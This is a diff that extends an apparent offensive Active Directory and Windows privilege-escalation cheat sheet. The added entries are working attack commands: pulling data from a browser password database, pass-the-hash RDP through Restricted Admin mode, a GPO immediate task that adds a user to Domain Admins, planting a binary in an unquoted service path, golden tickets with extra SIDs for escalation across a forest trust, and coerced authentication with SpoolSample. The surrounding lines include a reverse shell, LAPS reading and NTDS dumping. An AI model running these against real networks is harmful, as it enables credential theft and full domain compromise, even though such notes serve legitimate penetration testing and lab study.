@@ -142,6 +142,9 @@ Use this for interacting with AD objects from Kali without requiring a full Wind
 - **LAPS Password Reading**:
   - **Netexec**: `netexec smb 10.10.10.10 -u [USER] -p [PASS] --laps`
   - **pyLAPS**: `python3 pyLAPS.py --action get -d [DOMAIN] -u [USER] -p [PASS]`
+- **Offline Chrome Password Extraction**:
+  - *File*: `%LocalAppData%\Google\Chrome\User Data\Default\Login Data` (SQLite)
+  - *Action*: Copy file to Kali and query: `sqlite3 'Login Data' "SELECT origin_url, username_value FROM logins;"` (Note: `password_value` is encrypted).
 - **Offline NTDS Dumping (Secretsdump)**:
   - *Scenario*: You've stolen the `ntds.dit` and `SYSTEM` files from a backup or share.
   - `impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL`
@@ -177,6 +180,10 @@ Use this for interacting with AD objects from Kali without requiring a full Wind
   Import-Module .\Invoke-RunasCs.ps1
   Invoke-RunasCs -Username [USER] -Password [PASS] -Command "cmd.exe" -Remote 172.10.10.10:443
   ```
+- **Restricted Admin Mode RDP (Pass-the-Hash RDP)**:
+  - *Enable*: `New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value "0" -PropertyType DWORD -Force`
+  - *Login*: `mstsc.exe /v:10.10.10.10 /restrictedadmin`
+  - *Context*: Allows RDP access using the current user's token or via `pth-winexe`.
 
 ### AD Object Hijacking & BloodHound
 - **Collecting Data:**
@@ -191,6 +198,10 @@ Use this for interacting with AD objects from Kali without requiring a full Wind
   - *Why*: If you have write access to a Group Policy Object.
   - `.\SharpGPOAbuse.exe --AddLocalAdmin --GPOName "Default Domain Policy" --UserAccount [MY_USER]`
   - Apply immediately: `gpupdate /force`
+- **GPO Abuse via GPMC (Admin Interface)**:
+  - *Action*: If you have UI access and GenericWrite on a GPO, use `gpmc.msc`.
+  - *Path*: `Computer Configuration -> Preferences -> Control Panel Settings -> Scheduled Tasks`.
+  - *Task*: Create "Immediate Task" to run `net localgroup "Domain Admins" [USER] /add`.
 
 ### Native AD Enumeration (PowerShell)
 Use these when you have a shell but no tools (like BloodHound/Netexec) uploaded yet.
@@ -319,6 +330,11 @@ Include multiple variations for different OS targets and filtering environments.
   winpeas.exe any
   whoami /priv # Check for SeBackupPrivilege, SeImpersonatePrivilege
   ```
+- **Unquoted Service Path Discovery**:
+  ```powershell
+  wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """
+  ```
+  - *Exploit*: If path is `C:\Program Files\My App\service.exe`, place shell at `C:\Program.exe` or `C:\Program Files\My.exe`.
 - **SeBackupPrivilege Exploitation:**
   ```powershell
   reg save hklm\sam SAM
@@ -402,6 +418,19 @@ Include multiple variations for different OS targets and filtering environments.
   impacket-ticketer -nthash [SERVICE_NTHASH] -domain-sid [DOMAIN_SID] -domain [DOMAIN] -spn [SERVICE/HOST] [TARGET_USER]
   export KRB5CCNAME=[TARGET_USER].ccache
   ```
+
+### Forest Trust Exploitation (Golden Ticket + Extra SIDs)
+- **Why**: Escalate from a compromised Child Domain to the Forest Root Admin.
+- **Requirement**: Child `krbtgt` hash and SID, Parent Forest SID (find via `lsadump::trust` or `Get-DomainSID`).
+- **Execution**:
+  ```bash
+  mimikatz # kerberos::golden /user:Administrator /domain:[CHILD_DOMAIN] /sid:[CHILD_SID] /sids:[PARENT_SID]-519 /rc4:[CHILD_KRBTGT_HASH] /ptt
+  ```
+
+### Printer Bug (SpoolSample)
+- **Why**: Force a remote machine (like a DC) to authenticate to your server.
+- **Execution**: `.\SpoolSample.exe [TARGET_DC] [MY_LISTENER_SERVER]`
+- **Capture**: Combine with `Rubeus monitor` to catch the TGT.
 
 ### RBCD Attack (Resource-Based Constrained Delegation)
 - **Why**: Use if you have **GenericAll**, **GenericWrite**, or **WriteProperty (to msDS-AllowedToAct...)** on a Computer object.
@@ -510,4 +539,4 @@ Include multiple variations for different OS targets and filtering environments.
   ```
 
 ---
-**Balkan Final Word:** Keep your shells stable, your enumeration deep, and don't panic. If one door is locked, check the window! 🚀
+**Final Word:** Keep your shells stable, your enumeration deep, and don't panic. If one door is locked, check the window! 🚀
